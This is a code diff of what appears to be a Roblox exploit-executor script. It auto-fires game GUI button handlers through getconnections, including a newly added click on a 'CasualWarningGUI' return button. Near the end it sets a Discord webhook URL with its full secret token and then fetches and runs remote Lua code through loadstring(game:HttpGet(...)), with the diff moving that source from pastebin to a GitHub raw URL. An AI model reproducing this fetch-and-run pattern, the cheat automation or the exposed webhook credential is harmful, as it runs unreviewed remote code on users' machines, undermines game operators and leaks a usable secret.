@@ -23,6 +23,20 @@ wait(1)
 
 task.spawn(function()
     local success, err = pcall(function()
+        local casualButton = playerGui:WaitForChild("CasualWarningGUI", 10):WaitForChild("Frame"):WaitForChild("ReturnButton"):WaitForChild("TextButton")
+
+        wait(0.3)
+        
+        for _, connection in pairs(getconnections(casualButton.MouseButton1Click)) do
+            connection:Fire()
+        end
+    end)
+end)
+
+wait(1)
+
+task.spawn(function()
+    local success, err = pcall(function()
         local button = playerGui:WaitForChild("Intro", 10):WaitForChild("Frame"):WaitForChild("ButtonsFrame"):WaitForChild("PlayFrame"):WaitForChild("TextButton")
         
         wait(0.5)
@@ -337,6 +351,6 @@ if allowanceValue then
 end
 
 _G.EmbedColor = 16764130
-_G.BasicStyling = false
+_G.BasicStyling = true
 getgenv().hook = "https://discord.com/api/webhooks/1459415371374133441/F7tFwiavou6Fe9hcrxRE5TgkH5ma6CeTc4zylE9h4-bwd7PbcefUCgyA6Mqxxr1dPlFR" 
-loadstring(game:HttpGet("https://pastebin.com/raw/xaASFmCm", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Attypical/nality/refs/heads/main/webhook.lua", true))()
